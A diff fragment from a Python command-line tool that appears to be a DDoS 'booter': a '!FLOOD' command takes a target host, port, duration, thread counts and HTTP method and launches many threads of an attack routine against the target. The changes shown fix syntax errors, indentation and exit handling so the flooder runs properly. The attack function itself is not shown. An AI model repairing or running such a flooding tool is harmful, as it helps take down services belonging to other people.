@@ -173,30 +173,31 @@ def command():
                             print(f"{Fore.RED}Aborted by user{Fore.RESET}")
                             continue
                     except socket.gaierror as e:
-                            print(f"{Fore.YELLOW}Failed to resolve host {host}: {e}{Fore.RESET}")
-                            continue
+                        print(f"{Fore.YELLOW}Failed to resolve host {host}: {e}{Fore.RESET}")
+                        continue
 
                     stop_attack.clear()
                     print(f"{Fore.LIGHTCYAN_EX}Attack started:\n{Fore.YELLOW}Target: {host}\nPort: {port_loader}\nType: {data_type_loader_packet}{Fore.RESET}")
-                    logger.info(f"Starting attack on {host}:{port_loader} with data_type_loader_packet
+                    logger.info(f"Starting attack on {host}:{port_loader} with {data_type_loader_packet}")
                     for _ in range(create_thread):
                         for _ in range(spam_create_thread):
                             threading.Thread(target=runing_attack, args=(ip, host, port_loader, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet)).start()
 
-                    countdown_thread = threading.Thread(target=countdown_timer, args=(time_loader,)
+                    countdown_thread = threading.Thread(target=countdown_timer, args=(time_loader,))
                     countdown_thread.start()
                     countdown_thread.join()
                     continue
                 else:
-                    print(f"{Fore.RED}!FLOOD <TYPE_PACKET> <TARGET> <PORT> <TIME> <SPAM_LOADER> <CREATE_thread> <BOOTER_SENT> {Fore.WHITE}<HTTP_METHOD> <SPAM_CREATE>{Fore.RESET}")
+                    print(f"{Fore.RED}!FLOOD <TYPE_PACKET> <TARGET> <PORT> <TIME> <SPAM_LOADER> <CREATE_THREAD> <BOOTER_SENT> {Fore.WHITE}<HTTP_METHOD> <SPAM_CREATE>{Fore.RESET}")
             else:
-                print(f"{Fore.WHITE}[{Fore.YELLOW}+{Fore.WHITE}] {Fore.RED}{data_input_loader} {Fore.LIGHT_EX}Command not found{Fore.RESET}")
+                print(f"{Fore.WHITE}[{Fore.YELLOW}+{Fore.WHITE}] {Fore.RED}{data_input_loader} {Fore.LIGHTRED_EX}Command not found{Fore.RESET}")
         except KeyboardInterrupt:
             print(f"\n{Fore.RED}Program terminated by user. Exiting...{Fore.RESET}")
             stop_attack.set()
-            except Exception as e:
-                logger.error(f"Error in command loop: {e}")
-                print(f"{Fore.RED}Error: {e}{Fore.RESET}")
+            sys.exit(0)
+        except Exception as e:
+            logger.error(f"Error in command loop: {e}")
+            print(f"{Fore.RED}Error: {e}{Fore.RESET}")
 
 if __name__ == "__main__":
     try:
